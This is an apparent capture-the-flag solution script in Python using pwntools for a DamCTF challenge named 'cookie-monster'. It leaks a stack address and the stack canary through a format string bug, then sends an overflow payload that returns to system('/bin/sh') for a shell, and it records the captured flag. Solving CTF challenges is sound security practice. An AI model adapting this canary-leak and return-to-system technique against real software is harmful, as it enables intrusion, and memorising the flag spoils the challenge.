"""
Leak stack cookie and address from format string vulnerability, rop to system("/bin/sh")

One tricky bit is that a fair bit of the buffer is clobbered by the time you get to the actual
execve call in system, so make sure the "/bin/sh" string is far enough into the buffer to avoid that
"""
from pwn import *

binary_path = "./cookie-monster"
lib_path = "/lib/i386-linux-gnu/"

elf = context.binary = ELF(binary_path)
libc = ELF(lib_path + "libc.so.6")

gs="""
python
import splitmind
(splitmind.Mind()
    .tell_splitter(show_titles=True)
    .tell_splitter(set_title="gdb")
     #.above(of="main", display="expressions", size="75%")
     #.left(of="expressions", display="disasm", size="35%")
    .above(of="main", display="stack", size="75%")
    .left(of="stack", display="regs", size="66%")
    .right(of="regs", display="disasm")
).build(nobanner=True)
end

set follow-fork-mode parent

break *  0x08048668

continue
"""
def start():
    if args.DEBUG:
        context.log_level = "DEBUG"

    if args.REMOTE:
        # nc chals.damctf.xyz 31312
        return remote("chals.damctf.xyz", 31312)

    if args.GDB:
        context.terminal = ["tmux", "split-window", "-v", "-b", "-p", "80"]
        return gdb.debug(binary_path, gdbscript=gs, env={"LD_LIBRARY_PATH": lib_path})
    else:
        return process(["strace", "-f", binary_path], env={"LD_LIBRARY_PATH": lib_path})


def breakpoint(io, msg=None):
    if args.GDB:
        if msg is not None:
            print(f"*** BREAKPOINT: {msg} ***")
        else:
            print("*** BREAKPOINT ***")
        io.interactive()


io = start()

# Leak stack address and cookie through format string
io.sendline("%6$p %15$p")
io.readuntil("Hello ")
leak = io.readline()

buffer_addr = int(leak.split(b" ")[0], 16) - 36
stack_cookie = int(leak.split(b" ")[1], 16)

print(f"BUFFER {hex(buffer_addr)}")
print(f"COOKIE {hex(stack_cookie)}")

io.sendline(flat({
    0x18: b"/bin/sh\0",
    0x20: p32(stack_cookie),
    0x30: p32(elf.plt.system),
    0x38: p32(buffer_addr),
}))

# dam{s74CK_c00k13S_4r3_d3L1C10Us}


io.interactive()
